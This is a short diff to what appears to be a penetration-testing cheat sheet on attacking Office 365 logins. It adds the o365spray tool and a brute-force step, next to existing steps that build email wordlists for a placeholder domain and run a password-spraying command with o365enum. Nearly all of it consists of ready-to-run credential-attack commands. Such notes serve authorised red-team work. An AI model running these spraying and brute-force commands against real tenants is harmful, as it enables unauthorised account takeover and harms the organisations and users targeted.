@@ -10,6 +10,8 @@ Tools:
 
 3) o365enum https://github.com/gremwell/o365enum
 
+4) o365spray https://github.com/0xZDH/o365spray
+
 ### 1) Generate wordlist
 
     username-anarchy USER NAME -@ @megacorp.com > emails.txt
@@ -21,6 +23,10 @@ Tools:
 ### 3) Start a password spraying attack
 
     python3 o365enum.py -u emails.txt -p 'PASSWORD' -n 1 -m office.com
+
+### 4) Start a brute force attack
+
+    python3 o365spray.py --username USER.NAME@megacorp.com --passfile PASSWORDS.txt --domain megacorp.com --lockout 1 --spray
 
 ## Tenant Enumeration
 
